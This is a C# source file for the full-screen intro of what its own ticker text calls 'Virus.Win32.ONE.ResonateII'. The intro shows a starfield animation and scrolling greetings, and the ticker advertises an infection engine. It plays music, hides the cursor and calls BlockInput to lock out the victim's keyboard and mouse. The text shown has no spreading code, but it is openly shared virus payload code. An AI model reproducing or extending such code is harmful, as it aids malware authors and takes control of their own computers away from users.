using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Security.Cryptography;
using System.IO;
using SharpMod;
using SharpMod.Song;
using SharpMod.SoundRenderer;
using SharpMod.Player;

namespace ResonateII
{
    public partial class intro : Form
    {
        [System.Runtime.InteropServices.DllImportAttribute("user32.dll", EntryPoint = "BlockInput")]
        [return: System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)]
        public static extern bool BlockInput([System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)] bool fBlockIt);

        const int sc = 256;
        const int MAX_DEPTH = 32;
        static string[] tickerms = { "After months of development, I am pleased to present:", "ResonateII, the latest and coolest branch of the Galileo Project.", "Keep on the look out for the next virus using this Omnivorous iNfection Engine, coming soon to a forum near you.", "Greetz to: Toxoid_49b/GAiA, int7bh, foxxy, NO_BOOT_DEVICE, Mr. Dinkle, and SchrödingersCat", "Thanks to Mistejk for lots of help with unmanaged stuff.", "Virus.Win32.ONE.ResonateII, ©2016 justquant/GAiA" };

        static int tickm = 0;
        static double ticks = 0;

        public struct star
        {
            public double x, y, z;

            public star(double xc, double yc, double zc)
            {
                x = xc;
                y = yc;
                z = zc;
            }
        }

        public static star[] stars = new star[sc];

        public static void initStars()
        {
            for (var i = 0; i < sc; i++)
            {
                stars[i] = new star(JLib.rollDice(50) - 25, JLib.rollDice(50) - 25, JLib.rollDice(31));
            }
        }

        public intro()
        {
            InitializeComponent();
            FlanMOD.BASSMOD_Init(-1, 44100, BASSMOD_BASSInit.BASS_DEVICE_DEFAULT);
            FlanMOD.BASSMOD_MusicLoad(true, Properties.Resources.final_countdown, 0, 0, BASSMOD_BassMusic.BASS_MUSIC_RAMP | BASSMOD_BassMusic.BASS_MUSIC_LOOP | BASSMOD_BassMusic.BASS_MUSIC_SURROUND2);
            FlanMOD.BASSMOD_MusicPlay();
            Cursor.Hide();
            BlockInput(true);
            Width = Screen.PrimaryScreen.Bounds.Width;
            Height = Screen.PrimaryScreen.Bounds.Height;
            initStars();
            tick.Start();
            logo.Location = new Point(Width / 2 - logo.Width / 2, Height / 2 - logo.Height / 2);
            msg.Location = new Point(Width + 100, 5);
            tickerpanel.Size = new Size(Width, msg.Height + 10);
            tickerpanel.Location = new Point(0, Height - tickerpanel.Height);
            msg.Text = tickerms[0];
        }

        private void tick_Tick(object sender, EventArgs e)
        {
            ticks += 0.01;
            int R = (int)((Math.Sin(ticks) + 1) * 127) / 2;
            int B = (int)((Math.Cos(ticks) + 1) * 127) / 2;
            int G = (int)(-((Math.Sin(ticks) - 1)) * 127) / 2;
            int Ri = (int)((Math.Sin(ticks) + 1) * 127) / 4;
            int Bi = (int)((Math.Cos(ticks) + 1) * 127) / 4;
            int Gi = (int)(-((Math.Sin(ticks) - 1)) * 127) / 4;
            Color hshift = Color.FromArgb(R, G, B);
            Color iboxsh = Color.FromArgb(Ri, Gi, Bi);
            rect(0, 0, canvas.Width, canvas.Height, hshift);
            logo.BackColor = hshift;
            tickerpanel.BackColor = iboxsh;
            msg.BackColor = iboxsh;
            msg.Location = new Point(msg.Location.X - 5, msg.Location.Y);
            if (msg.Location.X < -msg.Width - 10)
            {
                msg.Location = new Point(Width + 100, msg.Location.Y);
                tickm++;
                try { msg.Text = tickerms[tickm]; } catch { tickm = 0; msg.Text = tickerms[tickm]; }
            }
            for (var i = 0; i < sc; i++)
            {
                stars[i].z -= 0.2;
                if (stars[i].z <= 0)
                {
                    stars[i].x = JLib.rollDice(50) - 25;
                    stars[i].y = JLib.rollDice(50) - 25;
                    stars[i].z = MAX_DEPTH;
                }
                double k = 128.0 / stars[i].z;
                int px = (int)(stars[i].x * k + canvas.Width / 2);
                int py = (int)(stars[i].y * k + canvas.Height / 2);
                if (px >= 0 && px <= canvas.Width && py >= 0 && py <= canvas.Height)
                {
                    float size = (float)((1 - stars[i].z / 32.0) * 5);
                    int shade = (int)((1 - stars[i].z / 32.0) * 255);
                    rect(px, py, size, size, Color.FromArgb(shade, shade, shade));
                }
            }
        }

        private void rect(int x1, int y1, float x2, float y2, Color c)
        {
            Brush pen = new SolidBrush(c);
            Graphics g = canvas.CreateGraphics();
            g.FillRectangle(pen, x1, y1, x2, y2);
        }
    }
}
